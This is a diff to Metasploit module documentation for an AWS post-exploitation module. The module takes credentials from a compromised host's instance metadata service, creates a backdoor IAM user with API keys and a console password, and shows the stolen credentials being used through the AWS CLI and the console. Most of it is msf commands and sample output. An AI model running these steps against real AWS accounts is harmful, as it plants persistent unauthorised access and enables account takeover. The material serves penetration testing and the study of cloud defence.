@@ -68,17 +68,6 @@ access keys from the metadata service. If this fails, search the instance for
 API access keys, e.g., see ~/.aws/credentials, and set `AccessKeyId`,
 `SecretAccessKey`, & `Token` (optional).
 
-## Options
-
-* `IAM_USERNAME`: set this if you would like to control the username for to user to be created
-* `AccessKeyId`: set this if you find access keys on the host and instance has no profile/privileges
-* `SecretAccessKey`: set this if you find access keys on the host and instance has no profile/privileges
-* `Token`: set this if you find access keys on the host and instance has no profile/privileges. This is optional as this signifies temporary keys, if you find these, these are most likely expired.
-* `Proxies`: depending on your environment, you may wan to proxy your calls to AWS.
-* `CREATE_API`: when true, creates API keys for this user
-* `CREATE_CONSOLE`: when true, creates a password for this user so that they can access the AWS console
-
-
 ### Establish a foothold
 
 You first need a foothold in AWS, e.g., here we use `sshexec` to get the
@@ -122,6 +111,33 @@ Active sessions
 
 ```
 
+## Options
+
+By default the module will:
+
+* create a randomly named IAM user and group
+* generate API Keys and User password for after  
+
+```
+msf exploit(sshexec) > use post/multi/escalate/aws_create_iam_user
+msf post(aws_create_iam_user) > show options
+
+Module options (post/multi/escalate/aws_create_iam_user):
+
+   Name             Current Setting  Required  Description
+   ----             ---------------  --------  -----------
+   AccessKeyId                       no        AWS access key
+   CREATE_API       true             yes       Add access key ID and secret access key to account (API, CLI, and SDK access)
+   CREATE_CONSOLE   true             yes       Create an account with a password for accessing the AWS management console
+   IAM_GROUPNAME                     no        Name of the group to be created (leave empty or unset to use a random name)
+   IAM_USERNAME                      no        Name of the user to be created (leave empty or unset to use a random name)
+   Proxies                           no        A proxy chain of format type:host:port[,type:host:port][...]
+   SESSION          1                yes       The session to run this module on.
+   SecretAccessKey                   no        AWS secret key
+   Token                             no        AWS session token
+
+```
+
 ## Overly Permissive Instance Profile
 
 Here we are assuming that we have taken over a host having an instance profile with
@@ -130,23 +146,26 @@ overly permissive access. Once a session is established, we can load
 e.g., `SESSION 1` and run the exploit.
 
 ```
-msf exploit(sshexec) > use auxiliary/admin/aws/aws_create_iam_user
-msf post(aws_create_iam_user) > set SESSION 1
-SESSION => 1
-msf post(aws_create_iam_user) > exploit
+msf post(aws_create_iam_user) > run
 
 [*] 169.254.169.254 - looking for creds...
-[*] Creating user: J2XXox11WW4brAcb
-[*] Connecting (iam.amazonaws.com)...
-[*] Creating group: J2XXox11WW4brAcb
-[*] Connecting (iam.amazonaws.com)...
-[*] Creating group policy: J2XXox11WW4brAcb
-[*] Connecting (iam.amazonaws.com)...
-[*] Adding user (J2XXox11WW4brAcb) to group: J2XXox11WW4brAcb
-[*] Connecting (iam.amazonaws.com)...
-[*] Creating API Keys for J2XXox11WW4brAcb
-[*] Connecting (iam.amazonaws.com)...
-[+] API keys stored at: /home/pwner/.msf4/loot/20161121175902_default_52.1.2.3_AKIA_881948.txt
+[*] Creating user: sLbcBX0DckwhCVge
+[*] Creating group: sLbcBX0DckwhCVge
+[*] Creating group policy
+[*] Adding user (sLbcBX0DckwhCVge) to group: sLbcBX0DckwhCVge
+[*] Creating API Keys for sLbcBX0DckwhCVge
+[*] Creating password for sLbcBX0DckwhCVge
+[-] Password does not conform to the account password policy.
+AWS Account Information
+=======================
+
+UserName          GroupName         SecretAccessKey                           AccessKeyId           Password          AccountId
+--------          ---------         ---------------                           -----------           --------          ---------
+sLbcVgeBX0DckwhC  sLbcVgeBX0DckwhC  jhsdlfjkhalkjdfhalskdhfjalsjkakhksdfhlah  AKIAAKIAAKIAAKIAAKIA  OS4pyRLbmGtTR3ok  097986286576       
+
+[+] AWS CLI/SDK etc can be accessed by configuring with the above listed values
+[+] AWS console URL https://Account_ID.signin.aws.amazon.com/console may be used to access this account
+[+] AWS loot stored at: /home/pwner/.msf4/loot/20161121175902_default_52.1.2.3_AKIA_881948.txt
 [*] Post module execution completed
 ```
 
@@ -154,21 +173,19 @@ If the host does not have an instance profile or the right access, the output wi
 
 ```
 [*] 169.254.169.254 - looking for creds...
-[*] Creating user: 3SFFML3ucP1AyP7J
-[*] Connecting (iam.amazonaws.com)...
-[-] User: arn:aws:sts::097986286576:assumed-role/msftest/i-abacadab is not authorized to perform: iam:CreateUser on resource: arn:aws:iam::097986286576:user/3SFFML3ucP1AyP7J
-[*] Creating group: 3SFFML3ucP1AyP7J
-[*] Connecting (iam.amazonaws.com)...
-[-] User: arn:aws:sts::097986286576:assumed-role/msftest/i-abacadab is not authorized to perform: iam:CreateGroup on resource: arn:aws:iam::097986286576:group/3SFFML3ucP1AyP7J
-[*] Creating group policy: 3SFFML3ucP1AyP7J
-[*] Connecting (iam.amazonaws.com)...
-[-] User: arn:aws:sts::097986286576:assumed-role/msftest/i-abacadab is not authorized to perform: iam:PutGroupPolicy on resource: group 3SFFML3ucP1AyP7J
-[*] Adding user (3SFFML3ucP1AyP7J) to group: 3SFFML3ucP1AyP7J
-[*] Connecting (iam.amazonaws.com)...
-[-] User: arn:aws:sts::097986286576:assumed-role/msftest/i-abacadab is not authorized to perform: iam:AddUserToGroup on resource: group 3SFFML3ucP1AyP7J
-[*] Creating API Keys for 3SFFML3ucP1AyP7J
-[*] Connecting (iam.amazonaws.com)...
-[-] User: arn:aws:sts::097986286576:assumed-role/msftest/i-abacadab is not authorized to perform: iam:CreateAccessKey on resource: user 3SFFML3ucP1AyP7J
+[*] Creating user: 6mTe7avvt6NzwOGh
+[-] User: arn:aws:sts::097986286576:assumed-role/msftest/i-abacadab is not authorized to perform: iam:CreateUser on resource: arn:aws:iam::097986286576:user/6mTe7avvt6NzwOGh
+[*] Creating group: 6mTe7avvt6NzwOGh
+[-] User: arn:aws:sts::097986286576:assumed-role/msftest/i-abacadab is not authorized to perform: iam:CreateGroup on resource: arn:aws:iam::097986286576:group/6mTe7avvt6NzwOGh
+[*] Creating group policy
+[-] User: arn:aws:sts::097986286576:assumed-role/msftest/i-abacadab is not authorized to perform: iam:PutGroupPolicy on resource: group 6mTe7avvt6NzwOGh
+[*] Adding user (6mTe7avvt6NzwOGh) to group: 6mTe7avvt6NzwOGh
+[-] User: arn:aws:sts::097986286576:assumed-role/msftest/i-abacadab is not authorized to perform: iam:AddUserToGroup on resource: group 6mTe7avvt6NzwOGh
+[*] Creating API Keys for 6mTe7avvt6NzwOGh
+[-] User: arn:aws:sts::097986286576:assumed-role/msftest/i-abacadab is not authorized to perform: iam:CreateAccessKey on resource: user 6mTe7avvt6NzwOGh
+[*] Creating password for 6mTe7avvt6NzwOGh
+[-] User: arn:aws:sts::097986286576:assumed-role/msftest/i-abacadab is not authorized to perform: iam:CreateLoginProfile on resource: user 6mTe7avvt6NzwOGh
+[-] User: arn:aws:sts::097986286576:assumed-role/msftest/i-abacadab is not authorized to perform: iam:GetUser on resource: user 6mTe7avvt6NzwOGh
 [*] Post module execution completed
 ```
 
@@ -190,20 +207,7 @@ SecretAccessKey => jhsdlfjkhalkjdfhalskdhfjalsjkakhksdfhlah
 msf post(aws_create_iam_user) > set SESSION 1
 SESSION => 1
 msf post(aws_create_iam_user) > run
-
-[*] 169.254.169.254 - looking for creds...
-[*] Creating user: NyTDbU9v6LzzCLXq
-[*] Connecting (iam.amazonaws.com)...
-[*] Creating group: NyTDbU9v6LzzCLXq
-[*] Connecting (iam.amazonaws.com)...
-[*] Creating group policy: NyTDbU9v6LzzCLXq
-[*] Connecting (iam.amazonaws.com)...
-[*] Adding user (NyTDbU9v6LzzCLXq) to group: NyTDbU9v6LzzCLXq
-[*] Connecting (iam.amazonaws.com)...
-[*] Creating API Keys for NyTDbU9v6LzzCLXq
-[*] Connecting (iam.amazonaws.com)...
-[+] API keys stored at: /home/pwner/.msf4/loot/20161121175902_default_52.1.2.3_AKIA_881948.txt
-[*] Post module execution completed
+...
 ```
 
 ## Loot
@@ -213,5 +217,32 @@ You can see the API keys stored in loot:
 ```
 $ cat ~/.msf4/loot/20161121175902_default_52.1.2.3_AKIA_881948.txt
 
-{"AccessKeyId":"AKIA...","SecretAccessKey":"THE SECRET ACCESS KEY...","AccessKeySelector":"HMAC","UserName":"metasploit","Status":"Active","CreateDate":"2016-11-21T17:59:51.967Z"}
+{"UserName":"6mTe7avvt6NzwOGh","GroupName":"6mTe7avvt6NzwOGh","SecretAccessKey":"jhsdlfjkhalkjdfhalskdhfjalsjkakhksdfhlah","AccessKeyId":"AKIAAKIAAKIAAKIAAKIA","AccountId":"097986286576"}
 ```
+
+These creds can be used to call the AWS API directly or you can login using the console.
+
+Configuring the CLI:
+
+```
+$ aws configure --profile test
+AWS Access Key ID [None]: AKIA...
+AWS Secret Access Key [None]: THE SECRET ACCESS KEY...
+Default region name [None]: us-west-2
+Default output format [None]: json
+```
+
+Call the API, e.g., get the Account ID:
+
+```
+$ aws iam --profile test list-account-aliases
+{
+    "AccountAliases": [
+        "Account_ID"
+    ]
+}
+```
+
+Login via the console using the username and password:
+
+Go to the AWS Console at https://Account_ID.signin.aws.amazon.com/console/ and login.
